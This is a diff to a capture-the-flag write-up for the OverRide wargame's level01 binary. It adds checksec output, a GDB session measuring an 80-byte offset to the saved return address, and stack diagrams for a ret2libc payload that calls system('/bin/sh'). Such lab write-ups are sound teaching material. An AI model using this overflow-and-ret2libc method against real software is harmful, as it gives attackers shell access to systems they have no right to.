@@ -25,9 +25,18 @@ The program asks for a username, then a password, and rejects us.
 ## Step 2: Analyze the binary protections
 
 ```
+level01@OverRide:~$ checksec --file level01
 level01@OverRide:~$ readelf -l ./level01 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 ```
+
+```
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level01
+level01@OverRide:~$ 
+```
+
 
 | Protection | Status | Impact |
 |-----------|--------|--------|
@@ -95,15 +104,76 @@ The password buffer starts at `esp + 0x1c` inside a stack frame of `0x60` (96 by
 
 ### Calculating the offset to EIP
 
+**Static estimate** from the disassembly:
+
 ```
-Buffer at:     esp + 0x1c  (= ebp - 0x44)
+Buffer at:     esp + 0x1c  (= ebp - 0x44, if no alignment gap)
 Saved EBP at:  ebp + 0x00
 Saved EIP at:  ebp + 0x04
 
-Offset = 0x44 + 4 = 0x48 = 72 bytes (static)
+Offset = 0x44 + 4 = 0x48 = 72 bytes (without alignment)
 ```
 
-However, `main` uses `and $0xfffffff0, %esp` for stack alignment, which adds extra padding. Testing with a cyclic pattern in GDB confirms the actual offset is **80 bytes**.
+However, `main` uses `and $0xfffffff0, %esp` which rounds ESP **down** to a
+16-byte boundary. This creates a variable gap between EBP and the top of the
+`sub $0x60` frame, so the static estimate is unreliable.
+
+**Dynamic measurement in GDB** — breakpoint at the `fgets` call (password read):
+
+```
+(gdb) b *0x08048574                          ← break right before fgets (password)
+Breakpoint 1 at 0x8048574
+(gdb) run
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+Enter Password:
+                                              ← hits breakpoint before reading input
+
+Breakpoint 1, 0x08048574 in main ()
+
+(gdb) x/wx $esp                              ← first word on stack = fgets arg0 (buffer ptr)
+0xffffd6b0:  0xffffd6cc                       ← buffer address = 0xffffd6cc
+
+(gdb) info frame
+Stack level 0, frame at 0xffffd720:
+ eip = 0x8048574 in main; saved eip 0xf7e45513
+ Saved registers:
+  ebx at 0xffffd710, ebp at 0xffffd718,
+  edi at 0xffffd714, eip at 0xffffd71c       ← saved EIP is at 0xffffd71c
+
+(gdb) p/d 0xffffd71c - 0xffffd6cc            ← saved_EIP_addr − buffer_addr
+$1 = 80                                      ← offset confirmed: 80 bytes
+```
+
+Key point: the buffer address must be read **at the time of `fgets`**, not at
+`ret`. The epilogue (`lea -0x8(%ebp), %esp` + pops) changes ESP, so measuring
+at `ret` gives a wrong result.
+
+### Stack layout at the time of fgets (addresses grow upward)
+
+```
+                 low addresses                                          high addresses
+                       │                                                      │
+                       ▼                                                      ▼
+  ┌────────────────────┬───────────┬──────────────┬───────┬───────┬───────────┬───────────┐
+  │    pass[0..63]     │   r (int) │  align / pad │  ebx  │  edi  │ saved EBP │ saved EIP │
+  │     64 bytes       │  4 bytes  │   variable   │   4   │   4   │     4     │     4     │
+  └────────────────────┴───────────┴──────────────┴───────┴───────┴───────────┴───────────┘
+  ▲                                                                           ▲
+  │                                                                           │
+  esp+0x1c (at fgets)                                                    ebp+0x04
+  │◄──────────────────────── 80 bytes (measured) ────────────────────────────►│
+```
+
+- **pass[64]**: the password buffer where `fgets` writes.
+- **r (4)**: local variable at `esp+0x5c`, stores `verify_user_pass` return value.
+- **align / pad**: extra bytes from `and $0xfffffff0, %esp` (0 to 12 bytes depending on initial stack alignment at runtime).
+- **ebx, edi**: callee-saved registers pushed in the prologue (`push %edi` / `push %ebx`).
+- **saved EBP**: old frame pointer pushed by `push %ebp`.
+- **saved EIP**: return address — **this is what we overwrite** at offset 80.
+
+The total 80 bytes = 64 (buffer) + 4 (r) + variable alignment + 4 (ebx) + 4 (edi) + 4 (saved EBP) = **80 on this VM** (confirmed by cyclic pattern).
 
 ---
 
@@ -130,15 +200,23 @@ $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 
 ## Step 8: Build the ret2libc payload
 
-The stack layout after overflow:
+What we send as the password (92 bytes total):
 
 ```
-[80 bytes padding] [system addr] [exit addr] ["/bin/sh" addr]
-                    ↑ EIP          ↑ return     ↑ argument
-                    lands here     for system    to system
+  byte 0                                    79  80       83  84       87  88       91
+  ┌──────────────────────────────────────────┬───────────┬───────────┬──────────────┐
+  │            'A' × 80  (padding)           │ system()  │  exit()   │  "/bin/sh"   │
+  │                                          │ 4 bytes   │ 4 bytes   │  4 bytes     │
+  └──────────────────────────────────────────┴───────────┴───────────┴──────────────┘
+                                              ▲           ▲            ▲
+                                         overwrites   return addr   1st argument
+                                         saved EIP    for system()  of system()
 ```
 
-When `main` returns, it pops the overwritten EIP and jumps to `system()`. The x86 calling convention places the return address and first argument right after, so `exit` becomes `system`'s return address and `"/bin/sh"` becomes its argument.
+When `main` executes `ret`, it pops the 4 bytes at the saved EIP position and
+jumps to `system()`. In the x86 **cdecl** calling convention, the next word on
+the stack is the return address for the callee (`exit()`), and the word after
+that is the first argument (`"/bin/sh"`).
 
 ---
 
